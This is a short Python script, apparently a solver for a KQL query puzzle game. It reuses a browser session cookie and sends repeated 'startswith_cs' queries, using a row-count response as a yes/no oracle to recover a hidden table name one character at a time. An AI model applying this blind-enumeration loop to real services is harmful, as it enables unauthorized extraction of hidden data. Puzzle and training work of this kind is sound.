import requests
import time

start_url = "https://kqlgame.ept.gg/start-game"
game_url = "https://kqlgame.ept.gg/game"

# cookie copied from my browser's devtools
cookie = {
    "session": "eyJsZXZlbCI6MSwic3RhcnRfdGltZSI6MTczMDc5NzgzNC40MTcwMjY4LCJ0YXJnZXRfcm93cyI6MzR9.ZynhCg.Ugw_G8KNPswmrna1fXIP52XtJ68"
}

s = requests.Session()
s.get(start_url, cookies=cookie)

def check_next_char(string):
    while True:
        for nextchar in "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz":
            data = {
                "query": f"""
                .show tables
                | where TableName != "StormEvents"
                | where TableName startswith_cs "{string+nextchar}"
                """
            }
            s.get(start_url, cookies=cookie)
            response = s.post(game_url, cookies=cookie, data=data).text
            if "The row count for your query was 1" in response:
                string += nextchar
                print("Found next valid string:", string)
                # restart `for` loop for next char
                break
        else:
            # only reached if break was not called
            return string

start = time.time()
print("Result:", check_next_char(""))
print("Time taken:", time.time()-start)